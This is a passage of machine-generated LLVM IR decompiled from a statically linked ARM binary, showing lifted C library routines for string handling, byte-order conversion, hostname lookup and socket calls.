dec_label_pc_aba0.dec_label_pc_abd8.loopexit_crit_edge: ; preds = %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge, %dec_label_pc_aba0.preheader
  %v1_aba4.lcssa = phi i32 [ %v1_aba452, %dec_label_pc_aba0.preheader ], [ %v1_aba4, %dec_label_pc_ab98.dec_label_pc_aba0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_abd8

dec_label_pc_abb0.dec_label_pc_abd8.loopexit_crit_edge: ; preds = %dec_label_pc_abb0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_abd8

dec_label_pc_abc0.dec_label_pc_abd8.loopexit_crit_edge: ; preds = %dec_label_pc_abc0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_abd8

dec_label_pc_abd8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_ab98.dec_label_pc_abd8.loopexit_crit_edge, %dec_label_pc_aba0.dec_label_pc_abd8.loopexit_crit_edge, %dec_label_pc_abb0.dec_label_pc_abd8.loopexit_crit_edge, %dec_label_pc_abc0.dec_label_pc_abd8.loopexit_crit_edge, %entry
  %v0_abe0 = phi i32 [ %v0_ab74, %entry ], [ %v1_abc4, %dec_label_pc_abc0.dec_label_pc_abd8.loopexit_crit_edge ], [ %v1_abb4, %dec_label_pc_abb0.dec_label_pc_abd8.loopexit_crit_edge ], [ %v1_aba4.lcssa, %dec_label_pc_aba0.dec_label_pc_abd8.loopexit_crit_edge ], [ %v7_abd0, %dec_label_pc_ab98.dec_label_pc_abd8.loopexit_crit_edge ], [ %v0_ab98.pr, %dec_label_pc_ab94 ]
  %v2_abd8 = icmp eq i32 %v0_abe0, 0
  store i1 %v2_abd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abd8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_abd8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_abd8
  %v1_abe0 = sub i32 7, %v0_abe0
  store i32 %v1_abe0, i32* @r2, align 4
  %v3_abe4 = mul i32 %v1_abe0, 4
  %v4_abe4 = add i32 %v3_abe4, ptrtoint (i32* @global_var_abec.74 to i32)
  call void @__pseudo_branch(i32 %v4_abe4)
  %v0_abec = load i32, i32* %r1.global-to-local, align 4
  %v1_abec = trunc i32 %v0_abec to i8
  %v2_abec = load i32, i32* @r3, align 4
  %v3_abec = inttoptr i32 %v2_abec to i8*
  store i8 %v1_abec, i8* %v3_abec, align 1
  %v4_abec = load i32, i32* @r3, align 4
  %v5_abec = add i32 %v4_abec, 1
  store i32 %v5_abec, i32* %r3.global-to-local, align 4
  %v0_abf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf0 = trunc i32 %v0_abf0 to i8
  %v3_abf0 = inttoptr i32 %v5_abec to i8*
  store i8 %v1_abf0, i8* %v3_abf0, align 1
  %v4_abf0 = load i32, i32* %r3.global-to-local, align 4
  %v5_abf0 = add i32 %v4_abf0, 1
  store i32 %v5_abf0, i32* %r3.global-to-local, align 4
  %v0_abf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf4 = trunc i32 %v0_abf4 to i8
  %v3_abf4 = inttoptr i32 %v5_abf0 to i8*
  store i8 %v1_abf4, i8* %v3_abf4, align 1
  %v4_abf4 = load i32, i32* %r3.global-to-local, align 4
  %v5_abf4 = add i32 %v4_abf4, 1
  store i32 %v5_abf4, i32* %r3.global-to-local, align 4
  %v0_abf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v3_abf8 = inttoptr i32 %v5_abf4 to i8*
  store i8 %v1_abf8, i8* %v3_abf8, align 1
  %v4_abf8 = load i32, i32* %r3.global-to-local, align 4
  %v5_abf8 = add i32 %v4_abf8, 1
  store i32 %v5_abf8, i32* %r3.global-to-local, align 4
  %v0_abfc = load i32, i32* %r1.global-to-local, align 4
  %v1_abfc = trunc i32 %v0_abfc to i8
  %v3_abfc = inttoptr i32 %v5_abf8 to i8*
  store i8 %v1_abfc, i8* %v3_abfc, align 1
  %v4_abfc = load i32, i32* %r3.global-to-local, align 4
  %v5_abfc = add i32 %v4_abfc, 1
  store i32 %v5_abfc, i32* %r3.global-to-local, align 4
  %v0_ac00 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac00 = trunc i32 %v0_ac00 to i8
  %v3_ac00 = inttoptr i32 %v5_abfc to i8*
  store i8 %v1_ac00, i8* %v3_ac00, align 1
  %v4_ac00 = load i32, i32* %r3.global-to-local, align 4
  %v5_ac00 = add i32 %v4_ac00, 1
  store i32 %v5_ac00, i32* %r3.global-to-local, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = trunc i32 %v0_ac04 to i8
  %v3_ac04 = inttoptr i32 %v5_ac00 to i8*
  store i8 %v1_ac04, i8* %v3_ac04, align 1
  %v4_ac04 = load i32, i32* %r3.global-to-local, align 4
  %v5_ac04 = add i32 %v4_ac04, 1
  store i32 %v5_ac04, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_aba0, { 1, 0 }
  uselistorder i32 %v12_abcc, { 1, 2, 0 }
  uselistorder i32 %v0_aba054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ab98.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ab88, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ab7c, { 1, 0 }
  uselistorder i32 %v0_ab74, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 1, 0, 5, 2, 3, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_abd8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_abb0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_ac7c = inttoptr i32 %arg2 to i8*
  %v3_ac7c = call i32 @_memcpy(i8* %v2_ac7c, i32 %arg1)
  ret i32 %v3_ac7c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ac84.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_ac84 = phi i32 [ %v0_ac84.pre, %bb ], [ %v5_ac84, %bb3 ]
  %v0_ac80 = phi i32 [ %tmp, %bb ], [ %v5_ac80, %bb3 ]
  %v1_ac80 = inttoptr i32 %v0_ac80 to i8*
  %v2_ac80 = load i8, i8* %v1_ac80, align 1
  %v1_ac84 = inttoptr i32 %v0_ac84 to i8*
  %v2_ac84 = load i8, i8* %v1_ac84, align 1
  %v3_ac84 = zext i8 %v2_ac84 to i32
  %v2_ac88 = icmp eq i8 %v2_ac80, 0
  br i1 %v2_ac88, label %.dec_label_pc_ac94_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_ac84 = add i32 %v0_ac84, 1
  %v5_ac80 = add i32 %v0_ac80, 1
  %v3_ac80 = zext i8 %v2_ac80 to i32
  %v10_ac8c = icmp eq i8 %v2_ac80, %v2_ac84
  br i1 %v10_ac8c, label %entry, label %dec_label_pc_ac94

.dec_label_pc_ac94_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_ac94

dec_label_pc_ac94:                                ; preds = %bb3, %.dec_label_pc_ac94_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_ac94_crit_edge ], [ %v3_ac80, %bb3 ]
  %v2_ac94.pre-phi = sub nsw i32 %.pn, %v3_ac84
  ret i32 %v2_ac94.pre-phi

; uselistorder directives
  uselistorder i8 %v2_ac80, { 0, 2, 1 }
  uselistorder i32 %v0_ac80, { 1, 0 }
  uselistorder i32 %v0_ac84, { 1, 0 }
  uselistorder label %dec_label_pc_ac94, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_aca0 = load i32, i32* @r0, align 4
  %v1_aca0 = load i32, i32* @r1, align 4
  %v2_aca0 = inttoptr i32 %v0_aca0 to i8*
  %v3_aca0 = call i32 @_memcpy(i8* %v2_aca0, i32 %v1_aca0)
  ret i32 %v3_aca0
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_acb8 = load i32, i32* @r0, align 4
  %v2_acb8 = inttoptr i32 %v0_acb8 to i8*
  %v3_acb8 = call i32 @__GI_memset(i8* %v2_acb8, i32 0)
  ret i32 %v3_acb8
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_acd01 = load i32, i32* @r1, align 4
  %v1_acd02 = inttoptr i32 %v0_acd01 to i8*
  %v2_acd03 = load i8, i8* %v1_acd02, align 1
  %v2_acd45 = icmp eq i8 %v2_acd03, 0
  store i1 %v2_acd45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_acd03, i8* %arg1, align 1
  br i1 %v2_acd45, label %dec_label_pc_ace0, label %dec_label_pc_acc8

dec_label_pc_acc8:                                ; preds = %entry, %dec_label_pc_acc8
  %v0_acc8 = load i32, i32* @r1, align 4
  %v1_acc8 = add i32 %v0_acc8, 1
  store i32 %v1_acc8, i32* @r1, align 4
  %v0_accc = load i32, i32* %r2.global-to-local, align 4
  %v1_accc = add i32 %v0_accc, 1
  store i32 %v1_accc, i32* %r2.global-to-local, align 4
  %v1_acd0 = inttoptr i32 %v1_acc8 to i8*
  %v2_acd0 = load i8, i8* %v1_acd0, align 1
  %v2_acd4 = icmp eq i8 %v2_acd0, 0
  store i1 %v2_acd4, i1* %cpsr_z.global-to-local, align 1
  %v3_acd8 = inttoptr i32 %v1_accc to i8*
  store i8 %v2_acd0, i8* %v3_acd8, align 1
  %v0_acdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_acdc, label %dec_label_pc_ace0, label %dec_label_pc_acc8

dec_label_pc_ace0:                                ; preds = %dec_label_pc_acc8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_acc8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_ace8 = urem i32 %arg1, 256
  %v0_ad083 = load i32, i32* @r0, align 4
  %v1_ad084 = urem i32 %v0_ad083, 4
  %v2_ad085 = icmp eq i32 %v1_ad084, 0
  br i1 %v2_ad085, label %dec_label_pc_ad10, label %dec_label_pc_acf0

dec_label_pc_acf0:                                ; preds = %entry, %dec_label_pc_ad04
  %v0_ad04 = phi i32 [ %v1_ad04, %dec_label_pc_ad04 ], [ %v0_ad083, %entry ]
  %v1_acf0 = inttoptr i32 %v0_ad04 to i8*
  %v2_acf0 = load i8, i8* %v1_acf0, align 1
  %v3_acf0 = zext i8 %v2_acf0 to i32
  store i32 %v3_acf0, i32* @r3, align 4
  %v9_acf4 = icmp eq i32 %v3_acf0, %v1_ace8
  br i1 %v9_acf4, label %dec_label_pc_adc4, label %dec_label_pc_acfc

dec_label_pc_acfc:                                ; preds = %dec_label_pc_acf0
  %v2_acfc = icmp eq i8 %v2_acf0, 0
  br i1 %v2_acfc, label %dec_label_pc_adc0, label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_acfc
  %v1_ad04 = add i32 %v0_ad04, 1
  %v1_ad08 = urem i32 %v1_ad04, 4
  %v2_ad08 = icmp eq i32 %v1_ad08, 0
  br i1 %v2_ad08, label %dec_label_pc_ad10, label %dec_label_pc_acf0

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ad04, %entry
  %v0_ad14 = phi i32 [ %v0_ad083, %entry ], [ %v1_ad04, %dec_label_pc_ad04 ]
  %v4_ad10 = mul nuw nsw i32 %v1_ace8, 256
  %v5_ad10 = or i32 %v4_ad10, %v1_ace8
  %v4_ad18 = mul i32 %v5_ad10, 65536
  %v5_ad18 = or i32 %v4_ad18, %v5_ad10
  br label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_adb8, %dec_label_pc_ad58, %dec_label_pc_ad10
  %v0_ad80 = phi i32 [ %v0_ad14, %dec_label_pc_ad10 ], [ %v4_ad1c, %dec_label_pc_ad58 ], [ %v4_ad1c, %dec_label_pc_adb8 ]
  %v1_ad1c = inttoptr i32 %v0_ad80 to i32*
  %v2_ad1c = load i32, i32* %v1_ad1c, align 4
  %v4_ad1c = add i32 %v0_ad80, 4
  %v2_ad24 = xor i32 %v2_ad1c, %v5_ad18
  %v2_ad28 = add i32 %v2_ad24, 2130640639
  store i32 %v2_ad28, i32* @ip, align 4
  %v2_ad30 = add i32 %v2_ad1c, 2130640639
  %v1_ad34 = sub i32 -1, %v2_ad1c
  %v2_ad38 = xor i32 %v2_ad30, %v1_ad34
  %v2_ad44 = and i32 %v2_ad38, -2130640640
  %v2_ad4c = icmp eq i32 %v2_ad44, 0
  br i1 %v2_ad4c, label %dec_label_pc_ad58, label %dec_label_pc_ad60

dec_label_pc_ad58:                                ; preds = %dec_label_pc_ad1c
  %v1_ad40 = sub i32 -1, %v2_ad24
  %v2_ad48 = xor i32 %v2_ad28, %v1_ad40
  %v2_ad50 = and i32 %v2_ad48, -2130640640
  %v2_ad58 = icmp eq i32 %v2_ad50, 0
  br i1 %v2_ad58, label %dec_label_pc_ad1c, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad1c, %dec_label_pc_ad58
  %v2_ad60 = inttoptr i32 %v0_ad80 to i8*
  %v3_ad60 = load i8, i8* %v2_ad60, align 1
  %v4_ad60 = zext i8 %v3_ad60 to i32
  store i32 %v4_ad60, i32* @r3, align 4
  %v9_ad64 = icmp eq i32 %v4_ad60, %v1_ace8
  br i1 %v9_ad64, label %dec_label_pc_adc4, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_ad60
  %v2_ad70 = icmp eq i8 %v3_ad60, 0
  br i1 %v2_ad70, label %dec_label_pc_adc0, label %dec_label_pc_ad78

dec_label_pc_ad78:                                ; preds = %dec_label_pc_ad70
  %v1_ad78 = add i32 %v0_ad80, 1
  %v2_ad78 = inttoptr i32 %v1_ad78 to i8*
  %v3_ad78 = load i8, i8* %v2_ad78, align 1
  %v4_ad78 = zext i8 %v3_ad78 to i32
  store i32 %v4_ad78, i32* @r3, align 4
  %v9_ad7c = icmp eq i32 %v4_ad78, %v1_ace8
  br i1 %v9_ad7c, label %dec_label_pc_adc4, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad78
  %v2_ad88 = icmp eq i8 %v3_ad78, 0
  br i1 %v2_ad88, label %dec_label_pc_adc0, label %dec_label_pc_ad90

dec_label_pc_ad90:                                ; preds = %dec_label_pc_ad88
  %v1_ad90 = add i32 %v0_ad80, 2
  %v2_ad90 = inttoptr i32 %v1_ad90 to i8*
  %v3_ad90 = load i8, i8* %v2_ad90, align 1
  %v4_ad90 = zext i8 %v3_ad90 to i32
  store i32 %v4_ad90, i32* @r3, align 4
  %v9_ad94 = icmp eq i32 %v4_ad90, %v1_ace8
  br i1 %v9_ad94, label %dec_label_pc_adc4, label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad90
  %v2_ada0 = icmp eq i8 %v3_ad90, 0
  br i1 %v2_ada0, label %dec_label_pc_adc0, label %dec_label_pc_ada8

dec_label_pc_ada8:                                ; preds = %dec_label_pc_ada0
  %v1_ada8 = add i32 %v0_ad80, 3
  %v2_ada8 = inttoptr i32 %v1_ada8 to i8*
  %v3_ada8 = load i8, i8* %v2_ada8, align 1
  %v4_ada8 = zext i8 %v3_ada8 to i32
  store i32 %v4_ada8, i32* @r3, align 4
  %v9_adac = icmp eq i32 %v4_ada8, %v1_ace8
  br i1 %v9_adac, label %dec_label_pc_adc4, label %dec_label_pc_adb8

dec_label_pc_adb8:                                ; preds = %dec_label_pc_ada8
  %v2_adb8 = icmp eq i8 %v3_ada8, 0
  br i1 %v2_adb8, label %dec_label_pc_adc0, label %dec_label_pc_ad1c

dec_label_pc_adc0:                                ; preds = %dec_label_pc_acfc, %dec_label_pc_adb8, %dec_label_pc_ada0, %dec_label_pc_ad88, %dec_label_pc_ad70
  br label %dec_label_pc_adc4

dec_label_pc_adc4:                                ; preds = %dec_label_pc_acf0, %dec_label_pc_ada8, %dec_label_pc_ad90, %dec_label_pc_ad78, %dec_label_pc_ad60, %dec_label_pc_adc0
  %v1_adc8 = phi i32 [ 0, %dec_label_pc_adc0 ], [ %v1_ada8, %dec_label_pc_ada8 ], [ %v1_ad90, %dec_label_pc_ad90 ], [ %v1_ad78, %dec_label_pc_ad78 ], [ %v0_ad80, %dec_label_pc_ad60 ], [ %v0_ad04, %dec_label_pc_acf0 ]
  ret i32 %v1_adc8

; uselistorder directives
  uselistorder i32 %v4_ad1c, { 1, 0 }
  uselistorder i32 %v2_ad1c, { 0, 2, 1 }
  uselistorder i32 %v0_ad80, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_ad10, { 1, 0 }
  uselistorder i32 %v1_ad04, { 1, 0, 2 }
  uselistorder i32 %v0_ad083, { 2, 1, 0 }
  uselistorder i32 %v1_ace8, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_adc4, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_adc0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_ad60, { 1, 0 }
  uselistorder label %dec_label_pc_acf0, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 808), i32* @r2, align 4
  %v0_adec = call i32 @strtok_r()
  ret i32 %v0_adec
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ae04 = udiv i32 %arg1, 256
  %v1_ae08 = mul i32 %arg1, 256
  %v4_ae0c = and i32 %v1_ae08, 65280
  %v5_ae0c = or i32 %v4_ae0c, %v3_ae04
  ret i32 %v5_ae0c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_ae2c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_ae2c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ae34 = udiv i32 %arg1, 256
  %v1_ae38 = mul i32 %arg1, 256
  %v4_ae3c = and i32 %v1_ae38, 65280
  %v5_ae3c = or i32 %v4_ae3c, %v3_ae34
  ret i32 %v5_ae3c
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_ae5c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_ae5c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_ae6c = ptrtoint i32* %stack_var_-12 to i32
  %v0_ae70 = load i32, i32* @r0, align 4
  %v2_ae70 = inttoptr i32 %v0_ae70 to i8*
  %v3_ae70 = call i32 @inet_aton(i8* %v2_ae70, i32 %v2_ae6c)
  %v2_ae74 = icmp eq i32 %v3_ae70, 0
  %v4_ae78 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_ae74, i32 -1, i32 %v4_ae78
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_ae98 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_ae98
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_aea8 = load i32, i32* @r4, align 4
  %v6_aea8 = load i32, i32* @r5, align 4
  %v0_aeb0 = load i32, i32* @r0, align 4
  store i32 %v0_aeb0, i32* @r4, align 4
  %v0_aeb4 = load i32, i32* @r1, align 4
  store i32 %v0_aeb4, i32* @r5, align 4
  %v0_aeb8 = call i32 @__GI___h_errno_location()
  %v0_aee0 = load i32, i32* @r4, align 4
  %v2_aee4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_aee4, i32* @ip, align 4
  %v0_aee8 = load i32, i32* @r5, align 4
  %v8_aef0 = call i32 @gethostbyname2_r(i32 %v0_aee0, i32 %v0_aee8, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 1252) to i32*), i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 812), i32 440, i32 %v2_aee4, i32 %v0_aeb8)
  %v3_aef4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_aea8, i32* @r4, align 4
  store i32 %v6_aea8, i32* @r5, align 4
  ret i32 %v3_aef4
}

define i32 @function_af08(i32 %arg1) local_unnamed_addr {
dec_label_pc_af08:
  %v0_af08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_af08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_af08
  %v2_af08 = load i32, i32* @ip, align 4
  %v5_af08 = udiv i32 %v2_af08, 64
  %v6_af08 = and i32 %v5_af08, %arg1
  %v2_af0c = load i32, i32* @r4, align 4
  %v3_af0c = udiv i32 %v2_af0c, 512
  %v4_af0c = mul i32 %v2_af0c, 8388608
  %v5_af0c = or i32 %v3_af0c, %v4_af0c
  %v8_af0c = and i32 %v6_af08, %v5_af0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_af08, %bb
  %v9_af0c = phi i32 [ %arg1, %dec_label_pc_af08 ], [ %v8_af0c, %bb ]
  ret i32 %v9_af0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_af10 = load i32, i32* @r7, align 4
  store i32 %v3_af10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_af38, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %entry
  %v0_af28 = call i32 @__GI___errno_location()
  %v0_af2c = load i32, i32* %r7.global-to-local, align 4
  %v1_af2c = sub i32 0, %v0_af2c
  %v2_af30 = inttoptr i32 %v0_af28 to i32*
  store i32 %v1_af2c, i32* %v2_af30, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_af3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_af38

dec_label_pc_af38:                                ; preds = %entry, %dec_label_pc_af28
  %v2_af3c = phi i32 [ %v3_af10, %entry ], [ %v2_af3c.pre, %dec_label_pc_af28 ]
  %v0_af38 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_af28 ]
  store i32 %v2_af3c, i32* @r7, align 4
  ret i32 %v0_af38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af38, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_af7c, label %dec_label_pc_af6c

dec_label_pc_af6c:                                ; preds = %entry
  %v0_af6c = call i32 @__GI___errno_location()
  %v0_af70 = load i32, i32* %r4.global-to-local, align 4
  %v1_af70 = sub i32 0, %v0_af70
  %v2_af74 = inttoptr i32 %v0_af6c to i32*
  store i32 %v1_af70, i32* %v2_af74, align 4
  br label %dec_label_pc_af7c

dec_label_pc_af7c:                                ; preds = %entry, %dec_label_pc_af6c
  %v1_af84 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_af6c ]
  ret i32 %v1_af84

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af7c, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_af8c = load i32, i32* @r7, align 4
  store i32 %v3_af8c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_afb4, label %dec_label_pc_afa4

dec_label_pc_afa4:                                ; preds = %entry
  %v0_afa4 = call i32 @__GI___errno_location()
  %v0_afa8 = load i32, i32* %r7.global-to-local, align 4
  %v1_afa8 = sub i32 0, %v0_afa8
  %v2_afac = inttoptr i32 %v0_afa4 to i32*
  store i32 %v1_afa8, i32* %v2_afac, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_afb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %entry, %dec_label_pc_afa4
  %v2_afb8 = phi i32 [ %v3_af8c, %entry ], [ %v2_afb8.pre, %dec_label_pc_afa4 ]
  %v0_afb4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_afa4 ]
  store i32 %v2_afb8, i32* @r7, align 4
  ret i32 %v0_afb4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_afb4, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_afc4 = load i32, i32* @r7, align 4
  store i32 %v3_afc4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_afec, label %dec_label_pc_afdc

dec_label_pc_afdc:                                ; preds = %entry
  %v0_afdc = call i32 @__GI___errno_location()
  %v0_afe0 = load i32, i32* %r7.global-to-local, align 4
  %v1_afe0 = sub i32 0, %v0_afe0
  %v2_afe4 = inttoptr i32 %v0_afdc to i32*
  store i32 %v1_afe0, i32* %v2_afe4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_aff0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_afec

dec_label_pc_afec:                                ; preds = %entry, %dec_label_pc_afdc
  %v2_aff0 = phi i32 [ %v3_afc4, %entry ], [ %v2_aff0.pre, %dec_label_pc_afdc ]
  %v0_afec = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_afdc ]
  store i32 %v2_aff0, i32* @r7, align 4
  ret i32 %v0_afec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_afec, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_affc = load i32, i32* @r7, align 4
  store i32 %v3_affc, i32* %stack_var_-8, align 4
  %v0_b008 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b008, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b008, -4095
  br i1 %tmp, label %dec_label_pc_b028, label %dec_label_pc_b018

dec_label_pc_b018:                                ; preds = %entry
  %v0_b018 = call i32 @__GI___errno_location()
  %v0_b01c = load i32, i32* %r7.global-to-local, align 4
  %v1_b01c = sub i32 0, %v0_b01c
  %v2_b020 = inttoptr i32 %v0_b018 to i32*
  store i32 %v1_b01c, i32* %v2_b020, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b028.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b028

dec_label_pc_b028:                                ; preds = %entry, %dec_label_pc_b018
  %v1_b02c = phi i32 [ %v0_b008, %entry ], [ -1, %dec_label_pc_b018 ]
  %v2_b028 = phi i32 [ %v3_affc, %entry ], [ %v2_b028.pre, %dec_label_pc_b018 ]
  store i32 %v2_b028, i32* @r7, align 4
  ret i32 %v1_b02c

; uselistorder directives
  uselistorder i32 %v0_b008, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b028, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_b034 = load i32, i32* @r4, align 4
  %v0_b03c = call i32 @__GI_getpid()
  %v2_b044 = call i32 @kill(i32 %v0_b03c, i32 %arg1)
  store i32 %v3_b034, i32* @r4, align 4
  ret i32 %v2_b044

; uselistorder directives
